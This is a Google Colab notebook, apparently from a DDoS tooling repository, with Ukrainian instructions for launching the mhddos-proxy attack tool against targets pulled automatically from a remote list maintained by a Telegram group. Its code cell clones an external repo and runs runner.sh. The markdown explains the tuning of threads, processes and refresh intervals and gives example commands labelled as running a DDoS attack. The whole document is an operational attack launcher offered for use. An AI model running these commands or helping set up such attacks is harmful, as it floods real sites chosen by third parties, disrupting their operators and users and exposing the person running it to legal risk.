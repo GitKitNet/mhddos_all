{
 "nbformat": 4,
 "nbformat_minor": 0,
 "metadata": {
  "colab": {
   "name": "auto_mhddos.ipynb",
   "private_outputs": true,
   "provenance": [],
   "collapsed_sections": []
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3"
  },
  "language_info": {
   "name": "python"
  }
 },
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "###### Цей скрипт використовує [mhddos-proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) для атаки цілей [з цього списку](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets).\n",
    "###### Цілі підбираються та оновлюються автоматично телеграм групою [Український Жнець](https://t.me/ukrainian_reaper_ddos).\n",
    "###### Весь код має вільний доступ та викладено [тут](https://github.com/white-sagittarius/auto_mhddos). Слава Україні!\n",
    "---\n",
    "#### <strong>Запуск</strong>: меню Runtime -> Run all\n",
    "#### <strong>Зупинка або рестарт</strong> -> Runtime -> Manage sessions -> Terminate\n",
    "##### (якщо ви не бачите меню вгорі, вимкніть AdBlock)\n",
    "---"
   ],
   "metadata": {
    "id": "02jB8Um4KqQS",
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "#@title Результати атаки (якщо оновлюються кожні ~2 хвилини -> все ОК): { display-mode: \"form\" }\n",
    "%cd ~\n",
    "%rm -rf auto_mhddos &> /dev/null\n",
    "!git clone https://github.com/white-sagittarius/auto_mhddos.git &> /dev/null\n",
    "%cd ~/auto_mhddos\n",
    "!bash runner.sh"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "<details>\n",
    "  <summary>Опціонально: натисніть для інструкції з <strong>автоматичної очистки виводу на екран</strong></summary>\n",
    "\n",
    "     - виведіть консоль вашого браузера; зазвичай, вона викликається клавішею F12\n",
    "     - переконайтесь, що фокус стоїть на вкладці Console\n",
    "     - скопіюйте текст нижче, вставте його у поле вводу після > та мигаючого | i нажміть ентер:\n",
    "    function ClearOutput(){ document.querySelector(\"iron-icon[command = 'clear-focused-or-selected-outputs']\").click() } setInterval(ClearOutput,300000)\n",
    "     - кожні 5 хвилин вивід результатів буде очищено; консоль браузера можна закривати\n",
    "\n",
    "</details>\n",
    "\n",
    "<details>\n",
    "  <summary>Опціонально: натисніть для додаткових параметрів запуску</summary>\n",
    "\n",
    "    `-r`, `--refresh-interval`. How frequently script should refresh targets. Download targets from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets) every NUMBER time units. SUFFIX may be \"m\" for minutes, \"h\" for hours or \"d\" for days. Suggested range: [10m, 1d]. Default: \"15m\"\n",
    "\n",
    "    `-p`, `--process-count`. How many separate [mhddos-proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) instances should run for each target. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [1, 8]. Default: \"5\"\n",
    "\n",
    "    `-t`, `--thread-count`. How many threads should send requests to a given target in parallel. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [250, 2000]. Default: \"1000\"\n",
    "\n",
    "    `-s`, `--stats-interval`. Frequentcy of network statistics output in seconds (i.e every N seconds). Format is \"HH:MM:SS\" - time in GMT+0, \"Mbps in\" - inbound traffic, \"Mbps out\" - outbound traffic. Example:\n",
    "    ```\n",
    "    [17:19:34]       0.37 ↓MBit/s↓        9.30 ↑MBit/s↑\n",
    "    [17:20:04]       0.37 ↓MBit/s↓        9.17 ↑MBit/s↑\n",
    "    [17:20:34]       0.40 ↓MBit/s↓        9.65 ↑MBit/s↑\n",
    "    ```\n",
    "    Suggested range [10, 300]. Default: \"30\"\n",
    "\n",
    "    Please note, that \"target\" is a single line from targets file here: https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets. This single line might contain multiple domains or IP addresses\n",
    "\n",
    "    ---\n",
    "\n",
    "    Example commands:\n",
    "\n",
    "    - Run DDoS attack with all defaults:\n",
    "    !bash runner.sh\n",
    "\n",
    "    - Run DDoS attack with with targets refreshed every 3 hours, spawning 1 mhddos proccess per target with 1000 threads each. Netwrok information is printed every 10 seconds:\n",
    "    !bash runner.sh --refresh-interval 3h --thread-count 1000 --process-count 1 --stats-interval 10\n",
    "\n",
    "    - Same command using short options:\n",
    "    !bash runner.sh -r 3h -t 1000 -p 1 -s 10\n",
    "\n",
    "    Long and short options can be mixed in a single command. Order of options does not matter. No options are required.\n",
    "</details>"
   ],
   "metadata": {
    "id": "5R0oboScD87x",
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  }
 ]
}